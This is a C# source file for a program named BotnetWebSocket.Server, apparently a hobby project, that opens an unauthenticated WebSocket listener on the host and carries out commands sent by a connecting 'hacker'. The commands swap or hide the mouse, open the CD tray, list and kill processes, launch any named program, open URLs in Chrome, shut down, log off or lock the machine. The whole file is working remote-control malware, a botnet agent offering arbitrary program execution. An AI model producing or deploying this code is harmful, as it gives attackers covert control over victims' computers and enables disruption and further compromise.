using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

// Import of DLL to work with WebSocket Protocol
// https://github.com/statianzo/Fleck
// http://tools.ietf.org/html/rfc6455
using Fleck;

// Import of DLL to work with ip and network
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;


namespace BotnetWebSocket.Server
{
    internal class Program
    {
        #region Methods to acess unmanaged code of Windows OS (DLL buit in C or C++) PINVOKE

        /// <summary>
        /// This method is responsible for swap the mouse button
        /// </summary>
        /// <see cref="http://pinvoke.net/default.aspx/user32/SwapMouseButton.html"/>
        /// <param name="fSwap"></param>
        /// <returns></returns>
        [DllImport("user32.dll")]
        static extern bool SwapMouseButton(bool fSwap);

        /// <summary>
        ///  Method to hide the mouse pointer
        /// </summary>
        /// <see cref="http://pinvoke.net/default.aspx/user32/ShowCursor.html"/>
        /// <param name="bShow"></param>
        /// <returns></returns>
        [DllImport("user32.dll")]
        static extern int ShowCursor(bool bShow);

        /// <summary>
        /// Method to open/close the cd/dvd driver
        /// </summary>
        /// <see cref="http://pinvoke.net/default.aspx/winmm/mciSendString.html"/>
        /// <param name="command"></param>
        /// <param name="buffer"></param>
        /// <param name="bufferSize"></param>
        /// <param name="hwndCallback"></param>
        /// <returns></returns>
        [DllImport("winmm.dll")]
        static extern Int32 mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);

        /// <summary>
        /// Method to logout of Windows
        /// </summary>
        /// <see cref="http://pinvoke.net/default.aspx/user32/ExitWindowsEx.html"/>
        /// <param name="uFlags"></param>
        /// <param name="dwReason"></param>
        /// <returns></returns>
        [DllImport("user32")]
        public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);

        /// <summary>
        /// Method to lock workstation
        /// <see cref="http://pinvoke.net/default.aspx/user32/LockWorkStation.html"/>
        /// </summary>
        [DllImport("user32")]
        public static extern void LockWorkStation();

        #endregion

        private static void SwapMouse(bool swap)
        {
            SwapMouseButton(swap);
        }

        private static void ShowCursorMouse(bool show)
        {
            ShowCursor(show);
        }

        private static void OpenCdDriver()
        {
            // "set CDAudio door open" is the command to open CD Driver
            mciSendString("set CDAudio door open", null, 127, IntPtr.Zero);
        }

        private static void CloseCdDriver()
        {
            // "set CDAudio door open" is the command to close CD Driver
            mciSendString("set CDAudio door closed", null, 127, IntPtr.Zero);
        }

        private static void Logoff()
        {
            ExitWindowsEx(0, 0);
        }

        private static void Lock()
        {
            LockWorkStation();
        }

        public static string GetMyIp()
        {
            // Verify if network is conected
            if (!NetworkInterface.GetIsNetworkAvailable())
            {
                return null;
            }
            // Return my local IP
            var host = Dns.GetHostEntry(Dns.GetHostName());
            return host
                .AddressList
                .FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
        }

        static void Main(string[] args)
        {
            var ip = GetMyIp();
            // A random port
            var port = 8989;
            var address = String.Format("ws://{0}:{1}", ip, port);

            // Object responsible to create a Web Socket Server
            var connection = new WebSocketServer(address);

            // Start to listner client
            connection.Start(client =>
            {
                // Method called when client connect (when hacker connect) 
                client.OnOpen = () =>
                {
                    Console.WriteLine("Connected!!! {0}", client.ConnectionInfo.ClientIpAddress);
                    client.Send("Connection Sucess!!!");
                };
                // Method called when client disconnect (when the hacker disconnect)
                client.OnClose = () => Console.WriteLine("Connection closed!!! {0}", client.ConnectionInfo.ClientIpAddress);
                // Method called when hacker send a command
                client.OnMessage = (command) =>
                {
                    if (string.Equals("swap", command))
                    {
                        Console.WriteLine("Swap Mouse");
                        SwapMouse(true);
                    }
                    else if (string.Equals("noswap", command))
                    {
                        Console.WriteLine("No Swap Mouse");
                        SwapMouse(false);
                    }
                    else if (string.Equals("hidemouse", command))
                    {
                        Console.WriteLine("Hide mouse");
                        ShowCursorMouse(false);
                    }
                    else if (string.Equals("showmouse", command))
                    {
                        Console.WriteLine("Show mouse");
                        ShowCursorMouse(true);
                    }
                    else if (string.Equals("opencd", command))
                    {
                        Console.WriteLine("Open CD");
                        OpenCdDriver();
                    }
                    else if (string.Equals("closecd", command))
                    {
                        Console.WriteLine("Close CD");
                        CloseCdDriver();
                    }
                    else if (string.Equals("getprocess", command))
                    {
                        Console.WriteLine("Get all process");
                        var allProcess = Process.GetProcesses();
                        // Transform allProcess in string, on process per line
                        var send = allProcess.Aggregate("", (current, processo) => current + processo.ProcessName + "\n");
                        client.Send(send);
                    }
                    else if (command.StartsWith("closeprocess"))
                    {
                        // Name of process to close
                        var processName = command.Split('_')[1];
                        if (processName == null) return;
                        Console.WriteLine("Close {0}", processName);
                        var process = Process.GetProcessesByName(processName);
                        foreach (var p in process.Where(p => p != null))
                        {
                            // Close process
                            p.Kill();
                        }
                    }
                    else if (command.StartsWith("startprocess"))
                    {
                        var processName = command.Split('_')[1];
                        Console.WriteLine("Start {0}", processName);
                        Process.Start(processName);
                    }
                    else if (command.StartsWith("opentab"))
                    {
                        // Open a tab in chrome
                        var url = command.Split('_')[1];
                        Console.WriteLine("Open tab in chrome {0}", url);
                        Process.Start("chrome.exe", url);
                    }
                    else if (string.Equals("shutdown", command))
                    {
                        Console.WriteLine("Shutdown PC. Bye!");
                        Thread.Sleep(2000);
                        Process.Start("shutdown", "/s /t 0");
                    }
                    else if (string.Equals("logoff", command))
                    {
                        Console.WriteLine("Logoff PC. Bye!");
                        Thread.Sleep(2000);
                        Logoff();
                    }
                    else if (string.Equals("lock", command))
                    {
                        Console.WriteLine("Lock PC. Bye!");
                        Thread.Sleep(2000);
                        Lock();
                    }
                    else if (string.Equals("help", command))
                    {
                        Console.WriteLine("Help");
                        var commands = new string[] {
                            "swap - Trocar botão do mouse"
                            , "noswap - Destrocar botão do mouse"
                            , "hidemouse - Esconder ponteiro do mouse"
                            , "showmouse - Mostrar ponteiro do mouse"
                            , "opencd - Abrir o driver de CD"
                            , "closecd - Fechar o driver de CD (se não for notebook)"
                            , "getprocess - Exibir todos os processos"
                            , "closeprocess_process - Fecha um processo onde 'process' é o nome do processo que você quer fechar, por exemplo: closeprocess_notepad - fecha o notepad"
                            , "startprocess_process - Abre um processo onde 'process' é o nome do processo que você quer abrir, por exemplo: openprocess_notepad - abri o notepad"
                            , "opentab_url - Abre uma url no chrome"
                            , "shutdown - Desliga a máquina"
                            , "logoff - Faz logoff"
                            , "lock - Bloqueia a máquina"
                        };
                        var help = commands.Aggregate("", (current, line) => current + line + "\n");
                        client.Send(help);
                    }
                };
            });
            Console.ReadKey();
        }
    }
}